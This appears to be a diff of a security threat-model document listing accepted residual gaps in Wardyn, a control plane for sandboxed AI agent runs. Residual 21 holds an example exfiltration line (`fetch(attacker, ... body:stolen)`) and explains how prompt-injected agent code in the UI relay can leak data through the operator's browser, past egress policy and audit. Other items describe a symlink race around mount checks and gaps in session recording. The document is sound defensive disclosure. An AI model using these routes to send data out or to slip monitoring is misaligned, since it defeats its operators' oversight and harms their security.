-    signed-in human — below what the member tier otherwise allows, and in the
-    `image` case widen one above it. Nothing about that reaches the tier this
-    residual is actually about. Grants bound MEMBERS only: admins, the admin
-    token and local mode are exempt at the top of the resolver, grant CRUD and
-    the enforcement switches are themselves `operatorOnly`, and an admin
-    therefore still writes the rows that would have bounded them. So the
-    sentence that matters is unchanged — every named operator can still rewrite
-    the policy that bounds them, there is still no separation of duty among
-    admins, and the ceiling on this residual is still attribution (now including
-    `capability.grant.*` and `capability.enforcement.write`) rather than
-    prevention.
+    **v0.6 did not change this.** Capability grants (§4.3, residual #20) bound
+    MEMBERS only: admins, the admin token and local mode are exempt at the top of
+    the resolver, and grant CRUD plus the enforcement switches are themselves
+    `operatorOnly` — an admin still writes the rows that would have bounded them.
+    No separation of duty among admins; the ceiling is still attribution (now
+    including `capability.grant.*` and `capability.enforcement.write`).
 
-15. **SSH gateway's admin override is a bounded-stale stamp, not a live
-    role check.** Since `0043_ssh_key_role.sql` (v0.6), SSH gateway
-    (`docs/SSH.md`) authorization is `run.created_by == the connecting key's
-    registered principal` OR the key's `role` column reads `admin`
-    (`internal/api/sshgateway.go`'s `sshAuth`). That closes the gap this
-    residual used to describe — an admin reaching another human's run no
-    longer needs the browser terminal — but opens a narrower one in its
-    place: `role` is stamped at `POST /me/ssh-keys` time, from the
-    registering session's role at that moment, and `sshAuth` never
-    re-consults the human's CURRENT role live — there is no per-connection
-    lookup. `0046_ssh_key_role_checked_at.sql` (v0.6) narrows the staleness
-    from unbounded to bounded: every successful OIDC login re-stamps BOTH
-    `role` and `role_checked_at` for every key that principal owns
-    (`oidc.Config.OnLogin`, wired in `cmd/wardynd/boot_deps.go` to
-    `store.RefreshSSHKeyRoles`), and `sshAuth` additionally refuses the
-    override once `role_checked_at` is older than `WARDYN_SSH_ROLE_TTL`
-    (default `24h`) — including when it was never stamped at all (`NULL`,
-    infinitely stale, the fail-closed reading for every pre-`0046` row).
-    Unlike the browser terminal's `requireOperator` gate (`GET
-    /runs/{id}/attach`'s admin-only, ticket-less session-cookie
-    fall-through), which reads the session's role fresh on every attach,
-    this is still bounded-stale, never live: a demoted admin's
-    already-registered SSH key keeps granting the override until whichever
-    comes first — their own next login (which re-stamps `role=member`),
-    `role_checked_at` aging past `WARDYN_SSH_ROLE_TTL` on its own (no login
-    required), or the key being deleted (self-service `DELETE
-    /me/ssh-keys/{fingerprint}`, or an operator with direct store access)
-    and, if re-registered, re-stamped with whatever role the human holds at
-    that later moment. A member's key never satisfies the override
-    regardless of stamp drift — only `role==admin` does, and a member can't
-    reach `role==admin` by any path but actually holding the admin role at a
-    stamping moment (registration or a later login). The override is audited
-    distinctly (`ssh.auth` success carries `override:true` whenever the
-    owner check failed and the role check is what passed the connection; a
-    TTL-refused attempt is a `ssh.auth` failure with its own reason string),
-    so the staleness ceiling is attributable after the fact even though it
-    isn't prevented up front on every single connection. Documented, not
-    silently assumed away, in `docs/SSH.md`'s Bounds section; the re-register
-    path (delete, then re-add) is still supported and still immediate — it is
-    no longer the ONLY way to force a re-stamp, an ordinary login does it too
-    — and there is no
-    in-place role-update endpoint.
+15. **SSH gateway's admin override is a bounded-stale stamp, not a live role
+    check.** Since `0043_ssh_key_role.sql` (v0.6), SSH authorization
+    (`docs/SSH.md`) is `run.created_by == the connecting key's registered principal`
+    OR the key's `role` column reads `admin` (`internal/api/sshgateway.go`'s
+    `sshAuth`) — but `role` is stamped at `POST /me/ssh-keys` time from the
+    registering session's role, and `sshAuth` never consults the CURRENT role live.
+    `0046_ssh_key_role_checked_at.sql` narrows the staleness from unbounded to
+    bounded: every successful OIDC login re-stamps BOTH `role` and
+    `role_checked_at` for that principal's keys (`oidc.Config.OnLogin`, wired in
+    `cmd/wardynd/boot_deps.go` to `store.RefreshSSHKeyRoles`), and `sshAuth` refuses
+    the override once `role_checked_at` exceeds `WARDYN_SSH_ROLE_TTL` (default
+    `24h`) — including when never stamped (`NULL`, infinitely stale, the fail-closed
+    reading for every pre-`0046` row). Still bounded-stale, never live: a demoted
+    admin's key keeps granting the override until their next login (re-stamping
+    `role=member`), the TTL aging out on its own, or the key being deleted
+    (`DELETE /me/ssh-keys/{fingerprint}`, or direct store access). A member's key
+    never satisfies the override regardless of drift — only `role==admin` does,
+    reachable only by holding the admin role at a stamping moment. Audited
+    distinctly (`ssh.auth` success carries `override:true` when the owner check
+    failed and the role check passed; a TTL-refused attempt is an `ssh.auth` failure
+    with its own reason string). No in-place role-update endpoint exists; the
+    re-register path is still immediate.
 
 16. **SSH key fingerprint squatting has no self-service remediation.** The
-    `ssh_public_keys.fingerprint` primary key is GLOBAL by design — a given
-    key must authenticate to exactly one principal, so two rows for the same
-    fingerprint would be a genuine ambiguity, not a feature. That correctness
-    property has a griefing residual: whoever `POST`s a given public key
-    FIRST owns that fingerprint forever, so a malicious (or merely
-    first-mover) registrant can squat a key someone else also holds — most
-    plausibly one whose public half is already posted somewhere public, like
-    a GitHub profile — permanently 409-ing the rightful holder's own
-    registration attempt. The 409 message is deliberately generic (does not
-    confirm the key exists under a different account, so probing "does
-    Wardyn have this key" is not free reconnaissance), but that is a
-    disclosure mitigation, not a fix: the squat itself is not detected or
-    prevented, only made harder to CONFIRM from outside. The only
-    remediation is operator-side, out of band (identity-verify the rightful
-    owner, then delete the squatted row directly — `docs/SSH.md`'s
-    "Reclaiming a squatted fingerprint") — there is no automated
-    dispute/ownership-transfer flow, and the freed fingerprint can be
-    re-squatted by anyone, including the original squatter, the instant it's
-    deleted. Low severity (SSH access to a specific run someone already owns
-    is the blast radius, not a broader compromise) but worth stating plainly
-    rather than leaving "why did my key registration 409 forever" unanswered.
+    `ssh_public_keys.fingerprint` primary key is GLOBAL by design — a key must
+    authenticate to exactly one principal — so whoever `POST`s a public key FIRST
+    owns that fingerprint forever, and a first-mover can squat a key someone else
+    also holds (most plausibly one whose public half is posted somewhere),
+    permanently 409-ing the rightful holder. The 409 message is deliberately
+    generic — it does not confirm the key exists under another account — but that is
+    a disclosure mitigation, not a fix. The only remediation is operator-side and
+    out of band (identity-verify the owner, then delete the squatted row —
+    `docs/SSH.md`'s "Reclaiming a squatted fingerprint"); there is no
+    dispute/ownership-transfer flow, and the freed fingerprint can be re-squatted
+    immediately. Low severity (SSH access to a run someone already owns).
 
 17. **Member self-approval of a run's own `egress_domain` requests.** v0.5's
-    role split (admin/member, narrower than the flat viewer/operator gate item
-    14 describes) lets a member `decide()` (`POST /approvals/{id}/approve|deny`)
-    an approval on a run THEY OWN, but only when its `Kind` is `egress_domain`;
-    `credential` and `tool_call` approvals stay admin-only regardless of
-    ownership — self-deciding either would let a member self-mint a real
-    credential (the shipped example policies' `github_token` grant ships
-    `requires_approval: true`) or reopen exactly the allowance
-    `composer.Clamp`'s ceiling exists to bound. That still leaves an
-    intentional residual: a member can self-approve a `wait_for_review`
-    first-use host on their own run with no second human in the loop — the
-    approval's `decided_by` gives ATTRIBUTION, not independent review, for a
-    member-owned run. **v0.6 narrows this, conditionally.** With the
-    `egress_host` capability kind ENFORCED (residual #20 — it ships off), a
-    member may decide an `egress_domain` approval only for a host they hold a
-    grant for: `authorizeMemberDecision` resolves the approval's requested host
-    through `capSeamAllowed` and answers `403` otherwise, audited as
-    `authz.denied` / `capability_egress_host`. A matching DENY bites even with
-    the switch off. A third, blunter lever — `WARDYN_EGRESS_SECOND_HUMAN=1`,
-    §"Four-eyes on egress approvals" below — refuses ANY self-approval
-    outright. So an operator has the two scoping levers, and they
-    close different halves: enforce `egress_host` (or write the deny) to bound
-    WHICH hosts a member may clear on their own run, and set the ceiling
-    policy's `first_use_approval` to `always_deny` (`composer.Clamp` takes the
-    stricter of ceiling vs. proposal) where the requirement is genuine
-    third-party sign-off on ANY first-use domain — a grant makes the decision
-    permissible, never independent. On a deployment that has done neither —
-    which is every deployment upgraded from 0.5 with no rows written —
-    `wait_for_review` remains something the owning member clears themselves.
+    admin/member split lets a member `decide()`
+    (`POST /approvals/{id}/approve|deny`) an approval on a run THEY OWN, but only
+    when its `Kind` is `egress_domain`; `credential` and `tool_call` stay admin-only
+    regardless of ownership — self-deciding either would let a member self-mint a
+    real credential (the shipped example policies' `github_token` grant ships
+    `requires_approval: true`) or reopen the allowance `composer.Clamp`'s ceiling
+    exists to bound. The intentional residual: a member can self-approve a
+    `wait_for_review` first-use host on their own run with no second human —
+    `decided_by` gives ATTRIBUTION, not independent review.
+
+    **v0.6 narrows this, conditionally.** With `egress_host` ENFORCED (residual
+    #20 — it ships off), a member may decide an `egress_domain` approval only for a
+    host they hold a grant for: `authorizeMemberDecision` resolves it through
+    `capSeamAllowed` and answers `403` otherwise, audited `authz.denied` /
+    `capability_egress_host`. A matching DENY bites even with the switch off. A
+    blunter lever — `WARDYN_EGRESS_SECOND_HUMAN=1`, § "Four-eyes on egress
+    approvals" — refuses ANY self-approval outright. They close different halves:
+    enforce `egress_host` (or write the deny) to bound WHICH hosts a member may
+    clear; set the ceiling policy's `first_use_approval` to `always_deny`
+    (`composer.Clamp` takes the stricter of ceiling vs. proposal) where genuine
+    third-party sign-off on ANY first-use domain is required — a grant makes the
+    decision permissible, never independent. On a deployment that has done neither
+    — every deployment upgraded from 0.5 with no rows written — `wait_for_review`
+    remains something the owning member clears themselves.
 
 18. **The UI-sandbox gateway shares ONE browser origin across runs unless the
     deployment has wildcard DNS.** In the default path mode
-    (`WARDYN_UI_SANDBOX_ORIGIN_TEMPLATE` unset) every run's relayed apps are
-    served from one origin under `/r/<run-id>/`, separated only by the relay
-    cookie's `Path` scope. That scoping is what stops the browser from
-    ATTACHING run A's session cookie to a request for run B — it is not an
-    origin boundary. Two runs' apps open at once are same-origin to each
-    other: run A's page can script run B's tab where it holds a window handle,
-    and origin-scoped browser storage (`localStorage`, `IndexedDB`, service
-    workers) is shared between them. The console is out of reach either way —
-    it is a different origin and boot refuses any configuration where it is
-    not (§4, B10) — so the blast radius is one run's UI app influencing
-    another run's UI app inside the SAME human's browser profile, both of
-    which that human already had open. Closing it needs infrastructure Wardyn
-    cannot supply on the operator's behalf: set
-    `WARDYN_UI_SANDBOX_ORIGIN_TEMPLATE` to a per-run host (wildcard DNS plus a
-    wildcard certificate) and each run gets its own browser origin, with an
-    enter served on any other host refused outright. Which mode is running is
-    published, not inferred — boot logs the shared-origin mode as a warning
-    and `/healthz` carries it as `ui_sandbox.host_mode`.
+    (`WARDYN_UI_SANDBOX_ORIGIN_TEMPLATE` unset) every run's relayed apps are served
+    from one origin under `/r/<run-id>/`, separated only by the relay cookie's
+    `Path` scope. That stops the browser ATTACHING run A's cookie to a request for
+    run B — it is not an origin boundary: two runs' apps open at once are
+    same-origin, so run A's page can script run B's tab where it holds a window
+    handle, and origin-scoped storage (`localStorage`, `IndexedDB`, service
+    workers) is shared. The console is out of reach either way (§4, B10), so the
+    blast radius is one run's UI app influencing another's inside the SAME human's
+    browser profile. Closing it needs infrastructure Wardyn cannot supply: set
+    `WARDYN_UI_SANDBOX_ORIGIN_TEMPLATE` to a per-run host (wildcard DNS + wildcard
+    certificate) and each run gets its own origin, with an enter served on any other
+    host refused outright. Which mode is running is published, not inferred — boot
+    logs the shared-origin mode as a warning and `/healthz` carries
+    `ui_sandbox.host_mode`.
 
-19. **A UI-app session is not recorded — only that it happened.** Session
-    recording (tmux, the PTY recorder, `internal/secretmask` masking, the
-    asciicast upload) covers the terminal lanes: the browser attach and SSH
-    shells. **None of it is on the relay path**, and that is a design
-    decision, not an omission — the relay carries an interactive app's HTTP
-    traffic, which is neither maskable by a verbatim-match secret masker nor
-    replayable as a cast, so Wardyn captures no keystrokes, no screen, no page
-    content and no request or response bodies. What lands in the append-only
-    log is `ui.auth` / `ui.start` / `ui.open` / `ui.close` with the app, the
-    port and the session's duration: who opened which declared app in which
-    run, and when they closed it. Those actions are deliberately NOT
-    `session.attach`, so a relay session can never surface in the run's
-    recording picker as though a replay of it existed. The consequence to
-    plan around: a deployment that needs "everything a human did inside a run
-    is replayable" does not have that property for a run whose policy declares
-    `ui_apps` — don't declare them on runs where replay is a compliance
-    requirement. The same already holds for `ssh -L` to a port plus a local
-    client (`docs/SSH.md`, "Recording"); the UI gateway makes the gap easier
-    to reach, and states it in the product (the console lane's own
-    no-recording line, `docs/design/ui-sandboxes-prompt.md`) rather than only
-    here. **The `ssh -L` reference above is one instance of a wider gap, not
-    the whole of it**: on every SSH-gateway-enabled run, `ssh.exec` records
-    only `argv`/`exit` and `ssh.sftp` only a byte count — the command's
-    stdout/stderr and the sftp payload itself are never captured, and sftp's
-    byte accounting undercounts because only one transfer direction is
-    metered. `docs/SSH.md`'s "Audit actions" names the fields honestly; this
-    residual is the fact that neither is a substitute for replay when a run's
-    policy needs one. There is no per-lane refusal today that blocks exec/sftp
-    on a run whose policy also demands replay — the two requirements can be
-    declared together and silently leave the exec/sftp portion unreplayable.
+19. **A UI-app session is not recorded — only that it happened.** Session recording
+    (tmux, the PTY recorder, `internal/secretmask` masking, the asciicast upload)
+    covers the terminal lanes: browser attach and SSH shells. **None of it is on the
+    relay path**, by design — the relay carries an interactive app's HTTP traffic,
+    neither maskable by a verbatim-match masker nor replayable as a cast — so Wardyn
+    captures no keystrokes, no screen, no page content and no request or response
+    bodies. What lands in the append-only log is `ui.auth` / `ui.start` / `ui.open`
+    / `ui.close` with the app, the port and the duration; those actions are
+    deliberately NOT `session.attach`, so a relay session can never surface in the
+    recording picker as though a replay existed. The console lane states its own
+    no-recording line in the product (`docs/design/ui-sandboxes-prompt.md`), not only
+    here. A deployment needing "everything a human did inside a run is replayable"
+    does not have that for a run whose policy declares `ui_apps`.
 
-20. **Capability enforcement is off until an admin turns it on, and three
-    narrower gaps sit underneath that default.** The v0.6 permissioning pillar
-    (§4, "Member escalating past a capability grant") is a real authorization
-    control, but it is published here because its shipped posture is
-    permissive, deliberately:
+    **The gap is wider than the relay** — the same already holds for `ssh -L` to a
+    port plus a local client (`docs/SSH.md`, "Recording"). On every
+    SSH-gateway-enabled run,
+    `ssh.exec` records only `argv`/`exit` and `ssh.sftp` only a byte count — the
+    command's stdout/stderr and the sftp payload are never captured, and sftp's byte
+    accounting undercounts because only one direction is metered (`docs/SSH.md`'s
+    "Audit actions"). Neither substitutes for replay, and no per-lane refusal blocks
+    exec/sftp on a run whose policy also demands replay — the two can be declared
+    together and silently leave that portion unreplayable.
+
+20. **Capability enforcement is off until an admin turns it on, and three narrower
+    gaps sit underneath that default.** The v0.6 permissioning pillar (§4.3) is a
+    real authorization control, published here because its shipped posture is
+    deliberately permissive:
 
     - **Every enforcement switch ships OFF.** An absent `capability_enforcement`
-      row means *not enforced*, so an upgraded 0.5 deployment behaves exactly as
-      it did — a member keeps every power the role split already gave them until
-      an admin flips a kind on, one kind at a time. That is fail-OPEN as a
-      default, traded for an upgrade that changes nothing, and it means "Wardyn
-      has per-capability permissioning" is never by itself a statement about a
-      given deployment's posture. `GET /permissions` (admin) and
-      `GET /me/capabilities` (member) both report which kinds are actually
-      enforced, so the real posture is queryable rather than assumed; deny rows
-      are the on-ramp that works with every switch still off.
-
+      row means *not enforced*, so an upgraded 0.5 deployment behaves exactly as it
+      did until an admin flips a kind on, one at a time. Fail-OPEN as a default,
+      traded for an upgrade that changes nothing — so "Wardyn has per-capability
+      permissioning" is never by itself a statement about a deployment's posture.
+      `GET /permissions` (admin) and `GET /me/capabilities` (member) report which
+      kinds are actually enforced; deny rows are the on-ramp that works with every
+      switch still off.
     - **A `group` DENY is not evaluated when the caller's group snapshot cannot
-      answer.** Group membership is a snapshot taken at LOGIN and carried in the
-      signed session cookie, capped at 2048 bytes of payload and dropped from the
-      sorted end (`maxSessionGroupsBytes`, `internal/auth/oidc/derive.go`), and a
-      pre-0.6 cookie carries no groups field at all. In both cases the group's
-      rows — including its denies — are simply not in the caller's subject set,
-      and with the kind unenforced that resolves as allow-by-default. So the
-      "blacklist one contractor without going fail-closed" property has two
-      unstated exceptions: a human in more groups than the cap holds, and a human
-      still riding a session minted before 0.6. Both clear on the next login, and
-      the condition is reported distinctly as `groups_snapshot_stale` on
+      answer.** Group membership is snapshotted at LOGIN into the signed session
+      cookie, capped at 2048 bytes and dropped from the sorted end
+      (`maxSessionGroupsBytes`, `internal/auth/oidc/derive.go`); a pre-0.6 cookie
+      carries no groups field at all. Either way the group's rows — including its
+      denies — are not in the caller's subject set, and with the kind unenforced
+      that resolves as allow-by-default. So "blacklist one contractor without going
+      fail-closed" has two unstated exceptions: a human in more groups than the cap
+      holds, and a human on a pre-0.6 session. Both clear on next login, and the
+      condition reports distinctly as `groups_snapshot_stale` on
       `GET /me/capabilities` rather than as "holds no groups". Where a deny must
-      bite regardless, write it against the **user** (either the lowercased OIDC
-      `sub` or the email — a row on either hits) instead of the group.
-
+      bite regardless, write it against the **user** (lowercased OIDC `sub` or
+      email).
     - **`PUT /permissions/enforcement` is a full-map replace whose
-      optimistic-concurrency guard is opt-in.** `If-Match`/ETag ship (0.6),
-      but a caller that never sends `If-Match` still replaces the whole map:
-      an omitted kind means *off*, so a stale admin tab re-submitting an older
-      map, or two admins toggling concurrently, silently turns an enforced kind
-      back off — the fail-open direction — and answers `200`. What bounds it is
+      optimistic-concurrency guard is opt-in.** `If-Match`/ETag ship (0.6), but a
+      caller that never sends `If-Match` replaces the whole map: an omitted kind
+      means *off*, so a stale admin tab or two concurrent admins silently turn an
+      enforced kind back off — the fail-open direction — and get `200`. Bounded by
       attribution, not prevention: every write emits
-      `capability.enforcement.write` into the append-only log. Re-fetch
-      `GET /permissions` immediately before writing. (The switches live in their
-      own table for exactly this class of reason — `PUT /site-config` is a full
-      replace too, and an authz control that any stale client could round-trip
-      away was not acceptable there either; this residual is the narrower form
-      that survives inside the dedicated route.)
+      `capability.enforcement.write`. Re-fetch `GET /permissions` before writing.
+    - **Admin-authored values are never narrowed, by doctrine.** A stored policy, a
+      workspace's own requirements, scan-seeded hosts and the model provider's own
+      egress reach a member's run untouched however few grants they hold. The
+      intended contract (residual #14 remains the frame), not a bypass — but read a
+      capability as bounding *authorship*, not *reach*.
 
-    - **Admin-authored values are never narrowed, by doctrine.** A capability
-      bounds what the MEMBER chose and nothing else, so a stored policy, a
-      workspace's own requirements, the hosts a workspace scan seeded and the
-      model provider's own egress reach a member's run untouched however few
-      grants that member holds — a member granted a workspace inherits
-      everything the admin already attached to it. That is the intended contract
-      (residual #14's "the control plane authenticates; it barely authorizes"
-      remains the frame), not a bypass, but an operator reasoning about blast
-      radius should read a capability as bounding *authorship*, not *reach*.
-
-21. **The UI-sandbox relay is a browser-pivot egress channel, analyzed so far
-    only as a console-origin threat.** Residual #18 covers cross-run
-    scripting within the relay's shared origin; this is the separate,
-    un-analyzed direction. `handleUIRelay` (`internal/api/uigateway.go`)
-    serves the sandbox's own app content, and its doc comment is explicit
-    that this adds "no new network path out of the sandbox" (the `uigateway.go` package doc)
-    — true for the sandbox's netns. But the HTML/JS that content contains
-    then runs in the **operator's own browser**, which is not confined by
-    Wardyn at all: a `fetch(attacker, {mode:'no-cors', body:stolen})` issued
-    by sandbox-authored JS reaches the open internet through the operator's
-    normal browser networking, entirely outside `wardyn-proxy` and any egress
-    policy. The relay deliberately sets no CSP or `X-Frame-Options`
-    (`UIGatewayHandler`, comment: "this origin serves the sandbox's own app,
-    and the console's policy would break it") — a reasonable call for
-    serving an arbitrary dev server, but it means nothing on this response
-    constrains what that page's script can reach. Audit records only
-    `ui.auth`/`ui.open`/`ui.close` (residual #19) — no visibility into what
-    the page itself did over this channel. **Operator acknowledgment**:
-    opening a run's UI app runs that run's (agent-authored, possibly
-    prompt-injected) code in your browser, with your browser's own network
-    reach. A `Content-Security-Policy: connect-src 'self'` on relay responses
-    would narrow, not close, this — it stops in-page `fetch`/`XHR`/WebSocket
-    egress but not navigation or a form submit, and is not implemented.
+21. **The UI-sandbox relay is a browser-pivot egress channel, un-analyzed in that
+    direction** (residual #18 covers the cross-run scripting direction).
+    `handleUIRelay` (`internal/api/uigateway.go`) adds "no new network path out of
+    the sandbox" — true for the netns. But the served HTML/JS runs in the
+    **operator's own browser**, which Wardyn does not confine:
+    `fetch(attacker, {mode:'no-cors', body:stolen})` from sandbox-authored JS
+    reaches the open internet outside `wardyn-proxy` and any egress policy. The
+    relay deliberately sets no CSP or `X-Frame-Options` (`UIGatewayHandler`: "this
+    origin serves the sandbox's own app, and the console's policy would break it"),
+    and audit records only `ui.auth`/`ui.open`/`ui.close` (residual #19).
+    **Operator acknowledgment:** opening a run's UI app runs that run's
+    (agent-authored, possibly prompt-injected) code in your browser, with your
+    browser's network reach. A `Content-Security-Policy: connect-src 'self'` would
+    narrow, not close, this — it stops in-page `fetch`/`XHR`/WebSocket egress but
+    not navigation or a form submit — and is not implemented.
 
 22. **The UI-relay's 8-hour session cookie re-checks the run's state, not the
     principal's current authorization.** `uiSessionTTL` is 8 hours
-    (`uiSessionTTL`, `internal/api/uigateway.go`); the cookie is minted once, at
-    `handleUIEnter` time, against the caller's role at that moment
-    (`handleUIEnter`). Every subsequent relayed request re-validates
-    only that the underlying run is still live (`uigateway.go`'s dial path) —
-    it never re-checks that the cookie's principal is still an admin, still
-    owns the run, or still exists as an active session. Revoke an admin's
-    role, or delete their OIDC session, mid-run: their UI-relay cookie keeps
-    working until either the 8-hour TTL lapses or the run itself stops. This
-    is a distinct surface from residual #15's SSH admin-role stamp (that one
-    is scoped to key registration; this one is a live per-request cookie that
-    could re-check and does not).
+    (`internal/api/uigateway.go`); the cookie is minted once at `handleUIEnter`
+    against the caller's role at that moment, and every later relayed request
+    re-validates only that the run is still live — never that the principal is still
+    an admin, still owns the run, or still has an active session. Revoke an admin's
+    role, or delete their OIDC session, mid-run: the relay cookie keeps working
+    until the TTL lapses or the run stops. Distinct from residual #15's SSH stamp
+    (scoped to key registration; this is a live per-request cookie that could
+    re-check and does not).
 
-23. **The shipped default deployment collapses the audited insider into the
-    trusted operator.** The actor table above (§1) treats "Platform operator
-    / SRE" as trusted and out of scope, and "Malicious insider (developer)"
-    as the audited adversary — but those are the SAME person on the topology
-    Wardyn actually ships today. `make setup`'s flagship path runs
-    `wardynd` in no-auth local mode on an empty admin token
-    (`docs/ENV.md`'s `WARDYN_ADMIN_TOKEN` row: an empty token plus a loopback
-    bind auto-enables it), so on a single developer's laptop the governed
-    developer IS the platform operator: they hold the Docker host the
-    "append-only" audit trail lives on (`docker compose down -v` deletes it
-    outright — `docs/OPERATIONS.md`'s "State stores" table: "Lose any of them
-    and the loss is permanent"), and they can edit policy/enforcement freely
-    as their own admin. Every
-    insider-attribution claim elsewhere in this document is void under that
-    topology, silently, unless this is said out loud: **the residual-#9
-    insider-admin exclusion is not a corner case on the laptop default — it
-    is the norm**. The real fix is the multi-user central-control-plane
-    topology (`docs/OPERATIONS.md`'s "Multi-user: who can change what"),
-    which requires the operator to actually be a separate party from the
-    developers whose runs they audit; nothing in the product enforces that
-    separation exists.
+23. **The shipped default deployment collapses the audited insider into the trusted
+    operator.** §1 treats "Platform operator / SRE" as trusted and out of scope and
+    "Malicious insider (developer)" as the audited adversary — the SAME person on
+    the topology Wardyn ships today. `make setup`'s flagship path runs `wardynd` in
+    no-auth local mode on an empty admin token (`docs/ENV.md`'s
+    `WARDYN_ADMIN_TOKEN` row: an empty token plus a loopback bind auto-enables it),
+    so the governed developer IS the platform operator: they hold the Docker host
+    the "append-only" audit trail lives on (`docker compose down -v` deletes it
+    outright — `docs/OPERATIONS.md`'s "State stores": "Lose any of them and the loss
+    is permanent") and edit policy/enforcement as their own admin. Every
+    insider-attribution claim elsewhere here is void under that topology unless said
+    out loud: **the residual-#9 insider-admin exclusion is not a corner case on the
+    laptop default — it is the norm**. The fix is the multi-user
+    central-control-plane topology (`docs/OPERATIONS.md`'s "Multi-user: who can
+    change what"); nothing in the product enforces that separation exists.
 
-24. **`TestAuthzMatrix`'s "cannot go stale" invariant does not cover the
-    UI-sandbox gateway.** The matrix's own coverage-boundary comment
-    (`TestAuthzMatrix`'s doctrine comment, `internal/api/authz_test.go`) names exactly one excluded surface —
-    the SSH gateway's separate listener — and explains why: `chi.Walk`
-    (`TestAuthzMatrix`'s `chi.Walk` enumeration) only discovers routes on `srv.router`, so a
-    route living on a different `http.Handler` is invisible to it whether or
-    not the comment says so. The UI-sandbox gateway is the second such
-    surface: `UIGatewayHandler` (`UIGatewayHandler`) is wired
-    as its own listener/handler, never registered on `srv.router`, so it is
-    exactly as invisible to `TestAuthzMatrix` as SSH is — but the comment
-    does not say so, which reads as a stronger guarantee ("every route") than
-    the test actually provides. This is a credibility/completeness gap in
-    what the matrix's green run is understood to mean, not a live
-    authorization hole: `uigateway_test.go` is that surface's own dedicated
-    test file and exercises its authorization today, the same relationship
-    `sshgateway_test.go` has to the SSH exclusion. A future route added to
-    the UI gateway's own router, though, would escape both the "walk finds
-    every route" guarantee and this document's notice of the exclusion,
-    exactly the failure mode `TestAuthzMatrix` exists to prevent everywhere
-    else.
+24. **`TestAuthzMatrix`'s "cannot go stale" invariant does not cover the UI-sandbox
+    gateway.** The matrix's own coverage-boundary comment
+    (`internal/api/authz_test.go`) names exactly one excluded surface — the SSH
+    gateway's separate listener — because `chi.Walk` only discovers routes on
+    `srv.router`, so a route living on a different `http.Handler` is invisible to it. `UIGatewayHandler` is wired as its own listener/handler, never
+    registered on `srv.router`, so it is exactly as invisible as SSH is — but the
+    comment does not say so, which reads as a stronger guarantee ("every route")
+    than the test provides. A credibility gap in what a green matrix run means, not
+    a live authorization hole: `uigateway_test.go` exercises that surface's
+    authorization today, the same relationship `sshgateway_test.go` has to the SSH
+    exclusion. A future route on the UI gateway's own router would escape both the
+    guarantee and this document's notice of the exclusion — the failure mode
+    `TestAuthzMatrix` exists to prevent everywhere else.
 
-25. **A member-authored mount's bind is still not atomic with its check
-    (TOCTOU), and the residual is accepted, not closed.** The member-mount gate
-    re-resolves the source with `EvalSymlinks` in the docker driver immediately
-    before handing the bind to `ContainerCreate` — as late as this process can
-    look — but validate and create remain two operations, exactly the window
-    `ValidateMountSource`'s own residual note already publishes for OPERATOR
-    mounts. A member with local root on the desktop can swap the source for a
-    symlink inside that window. We do not claim to defeat it. Two things bound
-    the blast radius, and they are the reason it is acceptable rather than
-    merely disclosed: the roots are **operator/MDM-set**, so the widest a member
-    can aim the race is *within the declared roots* — the target set cannot be
-    enlarged, only raced within — and the credential-dotfile deny-list matches
-    the **post-`EvalSymlinks` real path**, so a won race that lands on `~/.ssh`
-    inside a too-wide root is still refused unless the attacker also defeats
-    that list. The tests pin the ORDERING this argument depends on (the check
-    runs at the bind site, before the mount is appended, and no container exists
-    after a refusal); the race itself is not deterministically testable and no
-    test claims to cover it.
+25. **A member-authored mount's bind is still not atomic with its check (TOCTOU),
+    and the residual is accepted, not closed.** The gate re-resolves the source with
+    `EvalSymlinks` in the docker driver immediately before `ContainerCreate` — as
+    late as this process can look — but validate and create remain two operations,
+    exactly the window `ValidateMountSource`'s own residual note publishes for
+    OPERATOR mounts. A member with local root can swap the source for a symlink
+    inside that window; we do not claim to defeat it. Two things bound the blast
+    radius: the roots are **operator/MDM-set**, so the widest a member can aim the
+    race is *within the declared roots* — the target set cannot be enlarged, only
+    raced within — and the credential-dotfile deny-list matches the
+    **post-`EvalSymlinks` real path**, so a won race landing on `~/.ssh` inside a
+    too-wide root is still refused unless the attacker also defeats that list. The
+    tests pin the ORDERING this depends on; the race itself is not
+    deterministically testable and no test claims to cover it.
 
 26. **A reckless member root is a boot WARNING, not a boot refusal.** Setting
     `WARDYN_MEMBER_WORKSPACE_ROOTS` (or a `_MAP` entry, or
-    `WARDYN_MEMBER_WRITABLE_ROOTS`) to `/` or to the daemon's own `$HOME` leaves
-    the dotfile deny-list as the ONLY thing between a member and the operator's
-    credentials — and `wardynd` logs that at boot and starts anyway, matching
-    the `LocalMode`-on-unspecified-bind WARN precedent rather than refusing.
-    That is a deliberate decision (design O4) and it is the un-bounded corner of
-    residual #25: a member who is already local-root on a box whose operator set
-    a reckless root is bounded by the deny-list alone. A malformed root, by
-    contrast, DOES refuse boot — an allowlist that was silently misparsed is
-    worse than one that is merely wide. Operators point the roots at a dedicated
-    projects directory; the fail-closed default (unset = no member host mounts)
-    is what a deployment that ignores this gets.
+    `WARDYN_MEMBER_WRITABLE_ROOTS`) to `/` or the daemon's own `$HOME` leaves the
+    dotfile deny-list as the ONLY thing between a member and the operator's
+    credentials — and `wardynd` logs that at boot and starts anyway, matching the
+    `LocalMode`-on-unspecified-bind WARN precedent. A deliberate decision (design
+    O4) and the un-bounded corner of residual #25: a member already local-root on
+    such a box is bounded by the deny-list alone. A malformed root DOES refuse boot
+    — an allowlist silently misparsed is worse than one merely wide. Point the roots
+    at a dedicated projects directory; the fail-closed default (unset = no member
+    host mounts) is what a deployment that ignores this gets.
 
 27. **`workspace_owner` makes cross-user admin access visible; it does not gate
-    it.** An admin reaching a member's owned workspace is authorized by design —
-    `ownsWorkspaceOrAdmin` short-circuits on `isOperator` — and support and
-    offboarding need exactly that. What v0.6 adds is attribution, not
-    separation of duties: the audit actor stays the ADMIN's own principal (never
-    the member's — there is no impersonation on this path, pinned by
-    `TestWorkspaceOwner_NoImpersonation`) and every such event carries
-    `workspace_owner`, so "which member's data did this admin touch" is a query.
-    Nothing asks a second human to approve it, nothing notifies the member, and
-    an admin who can rewrite the audit store at the database level is bounded
-    only by the hash chain's tamper-EVIDENCE (see above), not by this marker.
-    This is the workspace-noun instance of residual #14's "there is exactly one
-    operator tier", and it is bounded the same way.
+    it.** An admin reaching a member's owned workspace is authorized by design
+    (`ownsWorkspaceOrAdmin` short-circuits on `isOperator`) — support and
+    offboarding need it. v0.6 adds attribution, not separation of duties: the audit
+    actor stays the ADMIN's own principal (never the member's — no impersonation,
